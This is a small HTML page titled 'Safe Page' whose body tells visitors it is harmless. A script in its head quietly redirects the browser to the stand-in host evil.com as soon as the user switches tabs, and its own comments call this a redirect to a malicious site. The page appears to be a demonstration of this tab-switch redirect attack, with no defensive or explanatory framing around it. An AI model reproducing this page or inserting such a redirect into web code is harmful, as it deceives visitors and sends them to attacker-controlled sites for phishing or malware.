<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safe Page</title>
    <script type="text/javascript">
        // JavaScript function that detects when the tab is inactive
        document.addEventListener("visibilitychange", function () {
            if (document.hidden) {
                // When the tab becomes hidden (user switches tab), redirect to malicious site
                window.location.href = "http://evil.com";
            }
        });
    </script>
</head>
<body>
    <h1>Welcome to a Safe Page</h1>
    <p>This is a harmless page. Stay here as long as you want.</p>
</body>
</html>
